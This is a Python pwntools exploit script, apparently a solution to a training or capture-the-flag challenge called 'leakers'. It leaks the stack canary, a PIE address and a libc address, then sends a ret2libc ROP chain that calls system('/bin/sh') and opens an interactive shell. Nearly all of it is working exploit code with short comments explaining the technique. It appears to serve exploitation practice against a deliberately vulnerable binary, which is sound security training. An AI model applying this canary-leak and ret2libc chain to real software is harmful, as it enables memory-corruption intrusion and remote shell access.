from pwn import *

import sys
sys.path.append('../../')
import pwnutil as util

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2012)

r = process("./leakers") 

''' not attaching to remote
b * 0x4011d4
b * 0x401206
  
gdb.attach(r, """
	
        """)

'''

'''
elf = ELF("./leakers")
rop = ROP(elf)
gadget_offset = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as: ROPgadget --binary leakers | grep "pop rdi"

print("Gadget offset:")
print(gadget_offset)
input("atatat")
'''

'''
EXPLANATION
- here instead of loading shellcode into the bss and executing, we do a ret2libc.
	- since we are working with x64, we need to pass to system() a pointer to /bin/sh through the rdi register.
		-  we use a rop gadget for this.
'''

print(r.clean())
r.send(b'A')
input("wait")


offset_to_canary = 8*13 #offset to the canary, which is the first data we leak

def pre_leak_consumer(max_returned_bytes, filler_size):
	r.recvuntil(b'> ')
	r.recv(filler_size)
	leak = r.recv(max_returned_bytes - filler_size, timeout=0.01)
	return leak

acc = util.leak_bytes(r, 200, offset_to_canary, pre_leak_consumer)

print("\nLeaked: ")
util.print_packed(acc, 8)
print("\n")

#Previously calculated offsets
pie_base_offset = -0xac0
gadget_offset = 0xb23 #offset to a pop rdi; ret; gadget from pie base (ROPgadget --binary leakers | grep "pop rdi")
system_offset_from_leaked_libc = 0x2d949
binsh_offset_from_leaked_libc = 0x192563

#In acc we have the leaked stuff
# <canary> <pie_address> <libc_main_address>
# both the pie and libc addresses are an offset of their bases

#get canary
canary = b'\0' + acc[1:8]

#get leaked pie_address and offset it to the base
pie_leak = u64(acc[8:16])
pie_base = pie_leak + pie_base_offset
#calculate pop rdi; ret; gadget address from the pie base
gadget_address = pie_base + gadget_offset

#get leaked libc address
leaked_libc_address = u64(acc[16:24])
#calculate system and binsh addresses with the corresponding offsets
system_address = leaked_libc_address + system_offset_from_leaked_libc
binsh_address  = leaked_libc_address + binsh_offset_from_leaked_libc


print("Canary: " + hex(u64(canary)))
print("pie base: " + hex(pie_base))
print("gadget: " + hex(gadget_address))
print("Leaked libc: " + hex(leaked_libc_address))
print("binsh: " + hex(binsh_address))
print("system: " + hex(system_address))
print("\n")

input("Leak done, proceed to exploit")

ret2libc = b'A' * offset_to_canary + canary + b'A' * 8 + p64(gadget_address) + p64(binsh_address) + p64(gadget_address + 1)  + p64(system_address) + b'C' * 8
r.send(ret2libc)
r.clean()

input("done")

r.interactive()
